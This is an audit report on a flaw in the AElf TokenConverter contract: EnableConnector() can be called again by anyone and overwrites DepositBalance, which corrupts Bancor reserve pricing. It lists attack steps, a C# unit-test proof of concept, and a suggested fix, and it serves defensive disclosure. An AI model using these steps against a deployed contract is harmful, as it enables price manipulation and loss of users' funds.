# Audit Report

## Title
Deposit Balance Erasure Through Re-enabling Connector with Negative amountOutOfTokenConvert

## Summary
The `EnableConnector()` function lacks validation to prevent re-invocation on already-enabled connectors and unconditionally overwrites the `DepositBalance` state variable using assignment instead of addition. When combined with `GetNeededDeposit()` returning zero for negative `amountOutOfTokenConvert` values, any user can erase accumulated deposit balances by re-enabling active connectors, corrupting Bancor reserve accounting and enabling price manipulation attacks.

## Finding Description

The `GetNeededDeposit()` function calculates the amount of tokens outside the converter contract: [1](#0-0) 

When `balance + AmountToTokenConvert >= totalSupply`, this calculation produces non-positive values. The subsequent conditional check only sets `needDeposit` when positive: [2](#0-1) 

This causes the function to return `DepositInfo` with `NeedAmount = 0` for these cases.

The `EnableConnector()` function has no assertion preventing re-invocation after a connector is already enabled. Unlike `UpdateConnector()` which explicitly prevents modifications after activation: [3](#0-2) 

The `EnableConnector()` function lacks any such check: [4](#0-3) 

Most critically, `EnableConnector()` uses assignment (=) to set `DepositBalance`, completely replacing any existing value: [5](#0-4) 

This `DepositBalance` state variable is carefully maintained during normal trading by adding amounts in `Buy()`: [6](#0-5) 

And subtracting in `Sell()`: [7](#0-6) 

## Impact Explanation

The `GetSelfBalance()` helper function returns `State.DepositBalance[connector.Symbol]` for deposit account connectors: [8](#0-7) 

This balance is directly used in Bancor price calculations for both `Buy()`: [9](#0-8) 

And `Sell()` operations: [10](#0-9) 

The Bancor formulas require positive connector balances: [11](#0-10) 

When `DepositBalance` is corrupted to zero or an incorrect value, the Bancor pricing model produces drastically wrong prices. For example, if accumulated deposits of 10,000 ELF are erased while virtual balance is 1,000 ELF, the effective balance drops from 11,000 to 1,000 (91% reduction), causing extreme mispricing. This enables:

- **Arbitrage exploitation**: Attackers can exploit the price discrepancy to drain reserves by buying underpriced tokens and selling at correct market prices elsewhere
- **Reserve depletion**: The protocol's ability to maintain correct pricing is permanently compromised
- **User fund loss**: All subsequent traders receive/pay incorrect amounts based on corrupted reserve data

## Likelihood Explanation

The `EnableConnector()` function has no authorization checks (unlike `UpdateConnector()`, `SetFeeRate()`, and `AddPairConnector()` which call `AssertPerformedByConnectorController()`): [12](#0-11) 

This means any user can invoke it. The attack requires:

1. Connector already enabled and actively trading (achievable naturally)
2. Token balance in converter approaching total supply (occurs naturally through sustained selling pressure where token holders sell to the converter)
3. Attacker calls `EnableConnector()` with `AmountToTokenConvert = 0`
4. Since no token transfers are required when `needDeposit.NeedAmount = 0`, the attack has minimal cost (only gas fees)

The preconditions occur naturally during normal market operations, making this a realistic and easily executable attack. The lack of authorization and state validation makes prevention impossible without code changes.

**Probability: HIGH** - Natural preconditions, public method access, trivial execution.

## Recommendation

Add an assertion in `EnableConnector()` to prevent re-invocation on already-enabled connectors, mirroring the protection in `UpdateConnector()`:

```csharp
public override Empty EnableConnector(ToBeConnectedTokenInfo input)
{
    var fromConnector = State.Connectors[input.TokenSymbol];
    Assert(fromConnector != null && !fromConnector.IsDepositAccount,
        "[EnableConnector]Can't find from connector.");
    var toConnector = State.Connectors[fromConnector.RelatedSymbol];
    Assert(toConnector != null, "[EnableConnector]Can't find to connector.");
    
    // Add this check to prevent re-enabling
    Assert(!fromConnector.IsPurchaseEnabled, "Connector already enabled");
    Assert(!toConnector.IsPurchaseEnabled, "Connector already enabled");
    
    var needDeposit = GetNeededDeposit(input);
    // ... rest of function
}
```

Additionally, consider using addition (+=) instead of assignment (=) for `DepositBalance`, or ensure the connector has never been enabled before allowing the assignment.

## Proof of Concept

```csharp
[Fact]
public async Task EnableConnector_ReenableErasesDepositBalance_Test()
{
    // Setup: Initialize and create token
    await DefaultStub.Initialize.SendAsync(new InitializeInput { FeeRate = "0.005" });
    var tokenSymbol = "VULN";
    await CreateTokenAsync(tokenSymbol);
    await AddPairConnectorAsync(tokenSymbol);
    
    // Issue all tokens to converter to simulate balance â‰ˆ totalSupply
    await TokenContractStub.Issue.SendAsync(new IssueInput
    {
        Amount = 100_0000_0000,
        To = TokenConverterContractAddress,
        Symbol = tokenSymbol
    });
    
    // Initial enable with AmountToTokenConvert = 0
    await DefaultStub.EnableConnector.SendAsync(new ToBeConnectedTokenInfo
    {
        TokenSymbol = tokenSymbol,
        AmountToTokenConvert = 0
    });
    
    // Perform Buy operation to accumulate DepositBalance
    await DefaultStub.Buy.SendAsync(new BuyInput
    {
        Symbol = tokenSymbol,
        Amount = 1000,
        PayLimit = 10000
    });
    
    // Get deposit balance after buy - should be positive
    var depositBalanceBefore = await DefaultStub.GetDepositConnectorBalance.CallAsync(
        new StringValue { Value = tokenSymbol });
    depositBalanceBefore.Value.ShouldBeGreaterThan(0);
    
    // ATTACK: Re-enable connector with AmountToTokenConvert = 0
    // This should fail but doesn't due to missing check
    await DefaultStub.EnableConnector.SendAsync(new ToBeConnectedTokenInfo
    {
        TokenSymbol = tokenSymbol,
        AmountToTokenConvert = 0
    });
    
    // Verify DepositBalance has been erased
    var depositBalanceAfter = await DefaultStub.GetDepositConnectorBalance.CallAsync(
        new StringValue { Value = tokenSymbol });
    
    // This assertion proves the vulnerability - deposit balance reduced to virtual balance only
    depositBalanceAfter.Value.ShouldBeLessThan(depositBalanceBefore.Value);
    // The actual deposits are lost, breaking Bancor pricing
}
```

### Citations

**File:** contract/AElf.Contracts.TokenConverter/TokenConvert_Views.cs (L73-73)
```csharp
        var amountOutOfTokenConvert = tokenInfo.TotalSupply - balance - input.AmountToTokenConvert;
```

**File:** contract/AElf.Contracts.TokenConverter/TokenConvert_Views.cs (L75-84)
```csharp
        if (amountOutOfTokenConvert > 0)
        {
            var fb = fromConnector.VirtualBalance;
            var tb = toConnector.IsVirtualBalanceEnabled
                ? toConnector.VirtualBalance.Add(tokenInfo.TotalSupply)
                : tokenInfo.TotalSupply;
            needDeposit =
                BancorHelper.GetAmountToPayFromReturn(fb, GetWeight(fromConnector),
                    tb, GetWeight(toConnector), amountOutOfTokenConvert);
        }
```

**File:** contract/AElf.Contracts.TokenConverter/TokenConverterContract.cs (L58-60)
```csharp
    public override Empty UpdateConnector(Connector input)
    {
        AssertPerformedByConnectorController();
```

**File:** contract/AElf.Contracts.TokenConverter/TokenConverterContract.cs (L64-64)
```csharp
        Assert(!targetConnector.IsPurchaseEnabled, "connector can not be updated because it has been activated");
```

**File:** contract/AElf.Contracts.TokenConverter/TokenConverterContract.cs (L120-123)
```csharp
        var amountToPay = BancorHelper.GetAmountToPayFromReturn(
            GetSelfBalance(fromConnector), GetWeight(fromConnector),
            GetSelfBalance(toConnector), GetWeight(toConnector),
            input.Amount);
```

**File:** contract/AElf.Contracts.TokenConverter/TokenConverterContract.cs (L141-141)
```csharp
        State.DepositBalance[fromConnector.Symbol] = State.DepositBalance[fromConnector.Symbol].Add(amountToPay);
```

**File:** contract/AElf.Contracts.TokenConverter/TokenConverterContract.cs (L168-172)
```csharp
        var amountToReceive = BancorHelper.GetReturnFromPaid(
            GetSelfBalance(fromConnector), GetWeight(fromConnector),
            GetSelfBalance(toConnector), GetWeight(toConnector),
            input.Amount
        );
```

**File:** contract/AElf.Contracts.TokenConverter/TokenConverterContract.cs (L193-194)
```csharp
        State.DepositBalance[toConnector.Symbol] =
            State.DepositBalance[toConnector.Symbol].Sub(amountToReceive);
```

**File:** contract/AElf.Contracts.TokenConverter/TokenConverterContract.cs (L269-275)
```csharp
    public override Empty EnableConnector(ToBeConnectedTokenInfo input)
    {
        var fromConnector = State.Connectors[input.TokenSymbol];
        Assert(fromConnector != null && !fromConnector.IsDepositAccount,
            "[EnableConnector]Can't find from connector.");
        var toConnector = State.Connectors[fromConnector.RelatedSymbol];
        Assert(toConnector != null, "[EnableConnector]Can't find to connector.");
```

**File:** contract/AElf.Contracts.TokenConverter/TokenConverterContract.cs (L297-297)
```csharp
        State.DepositBalance[toConnector.Symbol] = needDeposit.NeedAmount;
```

**File:** contract/AElf.Contracts.TokenConverter/TokenConverterContract.cs (L374-390)
```csharp
    private long GetSelfBalance(Connector connector)
    {
        long realBalance;
        if (connector.IsDepositAccount)
            realBalance = State.DepositBalance[connector.Symbol];
        else
            realBalance = State.TokenContract.GetBalance.Call(
                new GetBalanceInput
                {
                    Owner = Context.Self,
                    Symbol = connector.Symbol
                }).Balance;

        if (connector.IsVirtualBalanceEnabled) return connector.VirtualBalance.Add(realBalance);

        return realBalance;
    }
```

**File:** contract/AElf.Contracts.TokenConverter/BancorHelper.cs (L37-38)
```csharp
        if (fromConnectorBalance <= 0 || toConnectorBalance <= 0)
            throw new InvalidValueException("Connector balance needs to be a positive number.");
```
